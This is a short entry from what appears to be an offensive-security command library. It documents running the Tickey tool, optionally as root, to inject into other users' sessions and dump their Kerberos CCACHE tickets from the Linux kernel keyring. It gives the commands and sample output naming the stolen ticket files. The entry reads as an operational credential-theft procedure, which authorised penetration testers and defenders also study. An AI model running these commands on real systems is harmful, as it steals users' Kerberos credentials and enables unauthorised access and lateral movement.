---
id: 62d373ce-e5f3-4096-865a-d139c73db266
name: run-tickey-to-extract-tickets
type: command
executor: bash
data: /tmp/tickey -i
output: null
created_at: '2023-04-06T03:56:08.565667+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - extraction
  - kerberos
verified: true
validated: true
---

# Run Tickey to Extract Tickets

## Command

```bash
/tmp/tickey -i
```

## Description

Executes the Tickey tool in injection mode to extract and dump Kerberos CCACHE tickets from the Linux kernel keyring for all detectable user sessions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i | Flag to initiate ticket injection and dumping from keyring | Yes |

## Examples

### Basic Usage

```bash
/tmp/tickey -i
```

### As Root for Full Access

```bash
sudo /tmp/tickey -i
```

## Expected Output

[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in user[UID] session...
[+] Successful injection at process PID of user[UID], look for tickets in /tmp/__krb_UID.ccache
[X] [uid:0] Error retrieving tickets (if applicable)

## Related

- [[procedures/extract-ccache-tickets-from-linux-keyring-with-tickey]]
- [[tools/tickey]]
